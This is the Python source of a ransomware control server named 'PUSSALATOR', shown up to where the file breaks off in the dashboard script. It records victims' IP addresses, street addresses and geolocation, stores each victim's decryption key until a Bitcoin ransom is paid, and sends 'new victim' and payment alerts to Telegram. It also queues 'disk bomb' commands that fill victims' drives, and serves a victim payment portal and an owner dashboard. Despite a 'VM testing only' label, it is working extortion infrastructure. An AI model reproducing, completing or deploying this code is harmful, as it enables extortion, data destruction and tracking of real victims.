#!/usr/bin/env python3
"""
PUSSALATOR - Complete Backend with Separate Pages
FOR VM TESTING ONLY
"""

import os
import sys
import json
import time
import random
import hashlib
import hmac
import secrets
import threading
import socket
import uuid
import subprocess
import logging
import platform
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect, Depends
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel
import requests
import uvicorn

# Try to import cryptography
try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "-q"])
    from cryptography.fernet import Fernet

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET')
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
    SERVER_URL = os.environ.get('SERVER_URL',)
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('pussalator.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('pussalator')

# ============================================================================
# TELEGRAM INTEGRATION
# ============================================================================

class TelegramService:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send(self, text: str) -> bool:
        if not self.enabled:
            return False
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={
                    'chat_id': self.chat_id,
                    'text': text,
                    'parse_mode': 'HTML'
                },
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def notify_new(self, victim: Dict) -> None:
        if self.enabled:
            msg = f"🔔 NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}, {victim.get('country','Unknown')}\nIP: {victim.get('ip','0.0.0.0')}"
            self.send(msg)
    
    def notify_payment(self, victim: Dict) -> None:
        if self.enabled:
            msg = f"💰 PAYMENT RECEIVED\nID: {victim['id']}\nAmount: {victim.get('ransom','0.5')} BTC\nTX: {victim.get('tx','')[:16]}..."
            self.send(msg)
    
    def notify_bomb(self, client_id: str, action: str, size: float = 0) -> None:
        if self.enabled:
            if action == "start":
                msg = f"💣 BOMB STARTED\nClient: {client_id}"
            elif action == "stop":
                msg = f"🛑 BOMB STOPPED\nClient: {client_id}"
            elif action == "progress":
                msg = f"📊 BOMB PROGRESS\nClient: {client_id}\nSize: {size:.2f} GB"
            else:
                msg = f"💣 BOMB {action.upper()}\nClient: {client_id}"
            self.send(msg)

telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

# ============================================================================
# DATABASE
# ============================================================================

class Database:
    def __init__(self, db_path: str = "pussalator_data.json"):
        self.db_path = db_path
        self.victims: Dict[str, Dict] = {}
        self.logs: List[Dict] = []
        self.bomb_commands: Dict[str, List[Dict]] = {}
        self.settings = {
            'ransom': Config.RANSOM_AMOUNT,
            'wallet': Config.BTC_WALLET,
            'window': 72,
            'version': '1.0.0'
        }
        self._load()
        logger.info(f"Database loaded: {len(self.victims)} victims")
    
    def _load(self):
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
                    self.logs = data.get('logs', [])
                    self.bomb_commands = data.get('bomb_commands', {})
                    self.settings.update(data.get('settings', {}))
        except Exception as e:
            logger.error(f"Load error: {e}")
    
    def _save(self):
        try:
            with open(self.db_path, 'w') as f:
                json.dump({
                    'victims': self.victims,
                    'logs': self.logs[-1000:],
                    'bomb_commands': self.bomb_commands,
                    'settings': self.settings
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Save error: {e}")
    
    def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
                   ip: str = "", country: str = "", city: str = "", 
                   region: str = "", zip_code: str = "", street: str = "",
                   lat: float = 0, lon: float = 0, isp: str = "",
                   organization: str = "", os_info: str = "") -> Dict:
        
        key = Fernet.generate_key().decode()
        now = datetime.now()
        deadline = now + timedelta(hours=self.settings['window'])
        
        victim = {
            'id': victim_id,
            'files': files,
            'ransom': f"{self.settings['ransom']} BTC",
            'wallet': self.settings['wallet'],
            'status': 'unpaid',
            'deadline': deadline.isoformat(),
            'created': now.isoformat(),
            'key': key,
            'hostname': hostname or socket.gethostname(),
            'ip': ip or '0.0.0.0',
            'country': country or 'Unknown',
            'region': region or 'Unknown',
            'city': city or 'Unknown',
            'zip': zip_code or 'Unknown',
            'street': street or 'Unknown',
            'lat': lat,
            'lon': lon,
            'isp': isp or 'Unknown',
            'org': organization or 'Unknown',
            'os': os_info or 'Unknown',
            'paid_at': None,
            'tx': None,
            'last_seen': now.isoformat(),
            'bomb_status': 'inactive',
            'bomb_size': 0,
            'notes': ''
        }
        
        self.victims[victim_id] = victim
        self._save()
        self.log('info', f"New victim: {victim_id}")
        telegram.notify_new(victim)
        return victim
    
    def get_victim(self, victim_id: str) -> Optional[Dict]:
        return self.victims.get(victim_id)
    
    def update_victim(self, victim_id: str, data: Dict) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id].update(data)
            self.victims[victim_id]['last_seen'] = datetime.now().isoformat()
            self._save()
            return True
        return False
    
    def verify_payment(self, victim_id: str, tx: str) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'paid'
            self.victims[victim_id]['tx'] = tx
            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
            self._save()
            self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
            telegram.notify_payment(self.victims[victim_id])
            return True
        return False
    
    def delete_victim(self, victim_id: str) -> bool:
        if victim_id in self.victims:
            del self.victims[victim_id]
            if victim_id in self.bomb_commands:
                del self.bomb_commands[victim_id]
            self._save()
            self.log('warning', f"Deleted: {victim_id}")
            return True
        return False
    
    def get_all(self) -> Dict:
        return self.victims
    
    def get_stats(self) -> Dict:
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        active_bombs = sum(1 for v in self.victims.values() if v.get('bomb_status') == 'active')
        
        try:
            amount = float(self.settings['ransom'])
            total_btc = paid * amount
        except:
            total_btc = paid * 0.5
        
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'btc': f"{total_btc:.2f}",
            'bombs': active_bombs,
            'time': datetime.now().isoformat()
        }
    
    def add_bomb_command(self, client_id: str, command: Dict):
        if client_id not in self.bomb_commands:
            self.bomb_commands[client_id] = []
        self.bomb_commands[client_id].append(command)
        self._save()
        logger.info(f"Bomb command added for {client_id}: {command}")
    
    def get_bomb_command(self, client_id: str) -> Optional[Dict]:
        if client_id in self.bomb_commands and self.bomb_commands[client_id]:
            cmd = self.bomb_commands[client_id].pop(0)
            self._save()
            return cmd
        return None
    
    def update_bomb_status(self, client_id: str, status: str, size: float = 0):
        if client_id in self.victims:
            self.victims[client_id]['bomb_status'] = status
            self.victims[client_id]['bomb_size'] = size
            self.victims[client_id]['last_seen'] = datetime.now().isoformat()
            self._save()
            
            if status == 'active' and size > 0:
                telegram.notify_bomb(client_id, "progress", size)
    
    def log(self, level: str, msg: str):
        entry = {
            'time': datetime.now().isoformat(),
            'level': level,
            'msg': msg
        }
        self.logs.append(entry)
        self._save()
        logger.info(f"[{level}] {msg}")
    
    def get_logs(self, limit: int = 100) -> List:
        return self.logs[-limit:]

db = Database()

# ============================================================================
# API MODELS
# ============================================================================

class VictimRegister(BaseModel):
    victim_id: str
    files: int = 0
    hostname: Optional[str] = None
    ip: Optional[str] = None
    country: Optional[str] = None
    region: Optional[str] = None
    city: Optional[str] = None
    zip: Optional[str] = None
    street: Optional[str] = None
    lat: Optional[float] = 0
    lon: Optional[float] = 0
    isp: Optional[str] = None
    organization: Optional[str] = None
    os: Optional[str] = None

class PaymentVerify(BaseModel):
    victim_id: str
    tx_id: str

class BombStart(BaseModel):
    client_id: str
    filename: str = "explosion.dat"

class BombStop(BaseModel):
    client_id: str

class BombUpdate(BaseModel):
    client_id: str
    size_gb: Optional[float] = 0
    bytes: Optional[int] = 0
    error: Optional[str] = None

class OwnerLogin(BaseModel):
    password: str

# ============================================================================
# AUTH
# ============================================================================

security = HTTPBasic()

def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
    if not hmac.compare_digest(creds.password.encode(), Config.OWNER_PASSWORD.encode()):
        raise HTTPException(status_code=401)
    return creds.username

# ============================================================================
# FASTAPI APP
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("=" * 50)
    logger.info("PUSSALATOR v1.0 STARTING")
    logger.info("=" * 50)
    logger.info(f"Port: {os.environ.get('PORT', 8000)}")
    logger.info(f"Victims: {len(db.victims)}")
    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
    logger.info("=" * 50)
    yield
    logger.info("Shutting down...")

app = FastAPI(
    title="PUSSALATOR",
    version="1.0.0",
    lifespan=lifespan,
    docs_url=None,
    redoc_url=None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# HTML TEMPLATES - Separate Pages
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 100px auto;
            border: 3px solid #ff0000;
            padding: 40px;
            background: #0a0a0a;
            box-shadow: 0 0 30px #ff0000;
            text-align: center;
        }
        
        h1 {
            font-size: 60px;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            margin-bottom: 20px;
            animation: flicker 2s infinite;
        }
        
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.8; }
            51% { opacity: 1; }
            60% { opacity: 0.9; }
            100% { opacity: 1; }
        }
        
        .subtitle {
            color: #ff6666;
            margin-bottom: 40px;
            font-size: 18px;
        }
        
        .button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 15px 30px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            width: 250px;
        }
        
        .button:hover {
            background: #ff6666;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .victim-button {
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
        }
        
        .victim-button:hover {
            background: #00ff00;
            color: black;
        }
        
        .ascii {
            color: #ff0000;
            font-size: 12px;
            white-space: pre;
            margin: 20px 0;
        }
        
        .stats {
            color: #ff6666;
            margin-top: 30px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">
    /\\____/\\    /\\____/\\
   (  o  o  )  (  o  o  )
   (   ==   )  (   ==   )
    (______)    (______)
        </div>
        
        <h1>PUSSALATOR</h1>
        <div class="subtitle">> SYSTEM CONTROL PANEL <</div>
        
        <a href="/victim">
            <button class="button victim-button">🔓 VICTIM PORTAL</button>
        </a>
        
        <a href="/owner/login">
            <button class="button">👑 OWNER LOGIN</button>
        </a>
        
        <div class="stats" id="stats">
            Loading stats...
        </div>
    </div>

    <script>
        async function loadStats() {
            try {
                const r = await fetch('/api/stats');
                const s = await r.json();
                document.getElementById('stats').innerHTML = 
                    `Victims: ${s.total} | Paid: ${s.paid} | BTC: ${s.btc} | Bombs: ${s.bombs}`;
            } catch(e) {}
        }
        
        loadStats();
        setInterval(loadStats, 5000);
    </script>
</body>
</html>
"""

VICTIM_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Victim Portal</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            margin: 50px auto;
            border: 3px solid #00ff00;
            padding: 30px;
            background: #0a0a0a;
        }
        
        h1 {
            font-size: 36px;
            color: #00ff00;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .warning {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 20px;
            margin-bottom: 30px;
            color: #ff6666;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        label {
            display: block;
            color: #00ff00;
            margin-bottom: 5px;
        }
        
        input {
            width: 100%;
            padding: 10px;
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 16px;
        }
        
        button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        
        button:hover {
            background: #66ff66;
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
        }
        
        .back {
            text-align: center;
            margin-top: 20px;
        }
        
        .back a {
            color: #666666;
            text-decoration: none;
        }
        
        .back a:hover {
            color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 VICTIM PORTAL</h1>
        
        <div class="warning">
            Enter your Client ID to check payment status and get decryption key.
        </div>
        
        <div class="input-group">
            <label>CLIENT ID:</label>
            <input type="text" id="victim_id" placeholder="e.g., DESKTOP-ABC123-20250312-1A2B3C4D">
        </div>
        
        <button onclick="checkVictim()">CHECK STATUS</button>
        
        <div id="result" class="result" style="display:none;"></div>
        
        <div class="back">
            <a href="/">← Back to Main</a>
        </div>
    </div>

    <script>
        async function checkVictim() {
            const id = document.getElementById('victim_id').value.trim();
            if (!id) {
                alert('Enter Client ID');
                return;
            }
            
            const r = await fetch(`/api/victim/${id}`);
            const result = document.getElementById('result');
            
            if (r.status === 200) {
                const v = await r.json();
                const deadline = new Date(v.deadline).toLocaleString();
                
                if (v.status === 'paid') {
                    result.innerHTML = `
                        <h3 style="color: #00ff00;">✅ PAYMENT VERIFIED</h3>
                        <p><strong>Client ID:</strong> ${v.id}</p>
                        <p><strong>Decryption Key:</strong></p>
                        <p style="background: black; padding: 10px; word-break: break-all;">${v.key}</p>
                        <p style="color: #ffff00;">Use this key with the recovery tool.</p>
                    `;
                } else {
                    result.innerHTML = `
                        <h3 style="color: #ff0000;">⏳ PAYMENT PENDING</h3>
                        <p><strong>Client ID:</strong> ${v.id}</p>
                        <p><strong>Files Encrypted:</strong> ${v.files}</p>
                        <p><strong>Ransom:</strong> ${v.ransom}</p>
                        <p><strong>Wallet:</strong> ${v.wallet}</p>
                        <p><strong>Deadline:</strong> ${deadline}</p>
                        <p><strong>Bomb Status:</strong> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}</p>
                        <p style="color: #ffff00;">Send payment to the wallet address above.</p>
                    `;
                }
                result.style.display = 'block';
            } else {
                result.innerHTML = '<h3 style="color: #ff0000;">❌ Client ID not found</h3>';
                result.style.display = 'block';
            }
        }
    </script>
</body>
</html>
"""

OWNER_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Owner Login</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            margin: 100px auto;
            border: 3px solid #ff0000;
            padding: 30px;
            background: #0a0a0a;
            text-align: center;
        }
        
        h1 {
            font-size: 36px;
            color: #ff0000;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        input {
            width: 100%;
            padding: 12px;
            background: black;
            border: 1px solid #ff0000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            font-size: 16px;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }
        
        button:hover {
            background: #ff6666;
        }
        
        .error {
            color: #ff6666;
            margin: 10px 0;
        }
        
        .back {
            margin-top: 20px;
        }
        
        .back a {
            color: #666666;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>👑 OWNER LOGIN</h1>
        
        <div id="error" class="error"></div>
        
        <div class="input-group">
            <input type="password" id="password" placeholder="ENTER PASSWORD" onkeypress="handleKey(event)">
        </div>
        
        <button onclick="login()">LOGIN</button>
        
        <div class="back">
            <a href="/">← Back to Main</a>
        </div>
    </div>

    <script>
        function handleKey(e) {
            if (e.key === 'Enter') login();
        }
        
        async function login() {
            const pwd = document.getElementById('password').value;
            const r = await fetch('/api/owner/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: pwd})
            });
            const d = await r.json();
            
            if (d.success) {
                window.location.href = '/owner/dashboard';
            } else {
                document.getElementById('error').innerHTML = '❌ Invalid password';
                document.getElementById('password').value = '';
            }
        }
    </script>
</body>
</html>
"""

OWNER_DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - Dashboard</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #ff0000;
            font-size: 36px;
            margin: 0;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            border: 2px solid #ff0000;
            padding: 20px;
            text-align: center;
            background: #1a0000;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #ff0000;
        }
        
        .stat-label {
            color: #ff6666;
            font-size: 12px;
        }
        
        .panel {
            border: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 20px;
            background: #1a1a1a;
        }
        
        .panel h3 {
            color: #ff0000;
            margin-top: 0;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
        }
        
        .bomb-control {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        input, select {
            background: black;
            border: 1px solid #ff0000;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
            flex: 1;
            min-width: 200px;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
        }
        
        button:hover {
            background: #ff6666;
        }
        
        .danger {
            background: black;
            color: #ff0000;
            border: 1px solid #ff0000;
        }
        
        .danger:hover {
            background: #ff0000;
            color: black;
        }
        
        .table-container {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            background: #ff0000;
            color: black;
            padding: 10px;
        }
        
        td {
            border: 1px solid #ff0000;
            padding: 8px;
        }
        
        .status-paid {
            color: #00ff00;
            font-weight: bold;
        }
        
        .status-unpaid {
            color: #ff0000;
            font-weight: bold;
        }
        
        .status-active {
            color: #ffaa00;
            font-weight: bold;
        }
        
        .progress-bar {
            width: 100px;
            height: 20px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
        }
        
        .progress-fill {
            height: 100%;
            background: #ff0000;
        }
        
        .logs {
            height: 150px;
            overflow-y: auto;
            background: black;
            border: 1px solid #ff0000;
            padding: 10px;
            font-size: 12px;
        }
        
        .logout-btn {
            background: black;
            color: #ff0000;
            border: 1px solid #ff0000;
            padding: 8px 16px;
            cursor: pointer;
        }
        
        .logout-btn:hover {
            background: #ff0000;
            color: black;
        }
        
        .tabs {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
        }
        
        .tab {
            background: #1a1a1a;
            color: #ff6666;
            padding: 10px 20px;
            cursor: pointer;
            border: 1px solid #ff0000;
            border-bottom: none;
        }
        
        .tab.active {
            background: #ff0000;
            color: black;
            font-weight: bold;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👑 PUSSALATOR DASHBOARD</h1>
            <div>
                <span id="timestamp" style="color: #666666; margin-right: 20px;"></span>
                <button class="logout-btn" onclick="logout()">LOGOUT</button>
            </div>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">VICTIMS</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">PAID</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">UNPAID</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BTC</div></div>
            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BOMBS</div></div>
        </div>
        
        <div class="tabs">
            <div class="tab active" onclick="showTab('victims')">📋 VICTIMS</div>
            <div class="tab" onclick="showTab('bombs')">💣 BOMB CONTROL</div>
            <div class="tab" onclick="showTab('logs')">📝 LOGS</div>
        </div>
        
        <div id="victims-tab" class="tab-content active">
            <div class="panel">
                <h3>📋 VICTIM LOOKUP</h3>
                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
                    <input type="text" id="victim_id" placeholder="Enter Victim ID">
                    <button onclick="getVictim()">GET VICTIM</button>
                    <button class="danger" onclick="deleteVictim()">DELETE</button>
                </div>
                <div id="victim_info" style="margin-bottom: 20px; padding: 10px; background: #1a1a1a;"></div>
            </div>
            
            <div class="panel">
                <h3>📊 ALL VICTIMS</h3>
                <div class="table-container">
                    <table id="victims_table">
                        <tr>
                            <th>ID</th>
                            <th>FILES</th>
                            <th>LOCATION</th>
                            <th>IP</th>
                            <th>STATUS</th>
                            <th>BOMB</th>
                            <th>DEADLINE</th>
                            <th>ACTIONS</th>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
        
        <div id="bombs-tab" class="tab-content">
            <div class="panel">
                <h3>💣 DISK BOMB CONTROL</h3>
                <div class="bomb-control">
                    <input type="text" id="bomb_client" placeholder="Client ID">
                    <input type="text" id="bomb_file" value="explosion.dat">
                </div>
                <div class="bomb-control">
                    <button onclick="startBomb()">💣 START BOMB</button>
                    <button class="danger" onclick="stopBomb()">🛑 STOP BOMB</button>
                    <button onclick="checkBomb()">📊 CHECK STATUS</button>
                </div>
                <div id="bomb_status" style="margin-top: 20px;"></div>
                <div class="progress-bar" id="bomb_progress" style="display:none;">
                    <div class="progress-fill" id="bomb_fill" style="width:0%"></div>
                </div>
            </div>
            
            <div class="panel">
                <h3>💣 ACTIVE BOMBS</h3>
                <div class="table-container">
                    <table id="bombs_table">
                        <tr>
                            <th>CLIENT ID</th>
                            <th>SIZE</th>
                            <th>STATUS</th>
                            <th>STARTED</th>
                            <th>ACTION</th>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div class="panel">
                <h3>📝 SYSTEM LOGS</h3>
                <div class="logs" id="logs"></div>
            </div>
        </div>
    </div>

    <script>
        let currentTab = 'victims';
        
        function showTab(tab) {
            currentTab = tab;
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelector(`.tab:nth-child(${tab === 'victims' ? 1 : tab === 'bombs' ? 2 : 3})`).classList.add('active');
            document.getElementById(`${tab}-tab`).classList.add('active');
        }
        
        async function loadStats() {
            try {
                const r = await fetch('/api/stats');
                const s = await r.json();
                document.getElementById('stats').innerHTML = `
                    <div class="stat-card"><div class="stat-value">${s.total}</div><div class="stat-label">VICTIMS</div></div>
                    <div class="stat-card"><div class="stat-value">${s.paid}</div><div class="stat-label">PAID</div></div>
                    <div class="stat-card"><div class="stat-value">${s.unpaid}</div><div class="stat-label">UNPAID</div></div>
                    <div class="stat-card"><div class="stat-value">${s.btc}</div><div class="stat-label">BTC</div></div>
                    <div class="stat-card"><div class="stat-value">${s.bombs}</div><div class="stat-label">BOMBS</div></div>
                `;
            } catch(e) {}
        }
        
        async function loadVictims() {
            try {
                const r = await fetch('/api/victims');
                const v = await r.json();
                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>BOMB</th><th>DEADLINE</th><th>ACTIONS</th></tr>';
                for (const [id, data] of Object.entries(v)) {
                    const deadline = new Date(data.deadline).toLocaleString();
                    const bombStatus = data.bomb_status === 'active' ? 
                        `<span class="status-active">ACTIVE ${data.bomb_size.toFixed(1)}GB</span>` : 
                        'inactive';
                    html += `<tr>
                        <td>${id}</td>
                        <td>${data.files}</td>
                        <td>${data.city || '?'}, ${data.country || '?'}</td>
                        <td>${data.ip}</td>
                        <td class="${data.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${data.status}</td>
                        <td>${bombStatus}</td>
                        <td>${deadline}</td>
                        <td><button class="danger" onclick="quickDelete('${id}')">X</button></td>
                    </tr>`;
                }
                document.getElementById('victims_table').innerHTML = html;
            } catch(e) {}
        }
        
        async function loadBombs() {
            try {
                const r = await fetch('/api/victims');
                const v = await r.json();
                let html = '<tr><th>CLIENT ID</th><th>SIZE</th><th>STATUS</th><th>STARTED</th><th>ACTION</th></tr>';
                for (const [id, data] of Object.entries(v)) {
                    if (data.bomb_status === 'active') {
                        html += `<tr>
                            <td>${id}</td>
                            <td>${data.bomb_size.toFixed(2)} GB</td>
                            <td class="status-active">ACTIVE</td>
                            <td>${new Date(data.last_seen).toLocaleString()}</td>
                            <td><button class="danger" onclick="quickStop('${id}')">STOP</button></td>
                        </tr>`;
                    }
                }
                document.getElementById('bombs_table').innerHTML = html;
            } catch(e) {}
        }
        
        async function loadLogs() {
            try {
                const r = await fetch('/api/logs');
                const l = await r.json();
                let html = '';
                l.slice(-50).forEach(log => {
                    html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
                });
                document.getElementById('logs').innerHTML = html;
            } catch(e) {}
        }
        
        async function startBomb() {
            const client = document.getElementById('bomb_client').value;
            const file = document.getElementById('bomb_file').value;
            if (!client) return alert('Enter Client ID');
            
            const r = await fetch('/api/bomb/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client, filename: file})
            });
            const d = await r.json();
            if (d.success) {
                alert('Bomb command sent');
                setTimeout(checkBomb, 2000);
            }
        }
        
        async function stopBomb() {
            const client = document.getElementById('bomb_client').value;
            if (!client) return alert('Enter Client ID');
            
            const r = await fetch('/api/bomb/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client})
            });
            const d = await r.json();
            if (d.success) {
                alert('Stop command sent');
                document.getElementById('bomb_progress').style.display = 'none';
                document.getElementById('bomb_status').innerHTML = '';
            }
        }
        
        async function checkBomb() {
            const client = document.getElementById('bomb_client').value;
            if (!client) return;
            
            const r = await fetch(`/api/victim/${client}`);
            if (r.status === 200) {
                const v = await r.json();
                if (v.bomb_status === 'active') {
                    document.getElementById('bomb_status').innerHTML = 
                        `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
                    document.getElementById('bomb_progress').style.display = 'block';
                    document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
                } else {
                    document.getElementById('bomb_status').innerHTML = 'No active bomb';
                    document.getElementById('bomb_progress').style.display = 'none';
                }
            }
        }
        
        async function quickStop(clientId) {
            const r = await fetch('/api/bomb/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId})
            });
            if (r.ok) {
                loadBombs();
                loadVictims();
            }
        }
        
        async function getVictim() {
            const id = document.getElementById('victim_id').value;
            const r = await fetch(`/api/victim/${id}`);
            if (r.status === 200) {
                const v = await r.json();
                document.getElementById('victim_info').innerHTML = `
                    <b>ID:</b> ${v.id}<br>
                    <b>Files:</b> ${v.files}<br>
                    <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
                    <b>IP:</b> ${v.ip}<br>
                    <b>ISP:</b> ${v.isp}<br>
                    <b>Status:</b> <span class="${v.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${v.status}</span><br>
                    <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
                    <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
                    ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
                `;
            } else {
                document.getElementById('victim_info').innerHTML = 'Victim not found';
            }
        }
        
        async function deleteVictim() {
            const id = document.getElementById('victim_id').value;
            if (!id) return;
            if (confirm('Delete ' + id + '?')) {
                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                loadVictims();
                loadBombs();
                document.getElementById('victim_info').innerHTML = '';
            }
        }
        
        async function quickDelete(id) {
            if (confirm('Delete ' + id + '?')) {
                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                loadVictims();
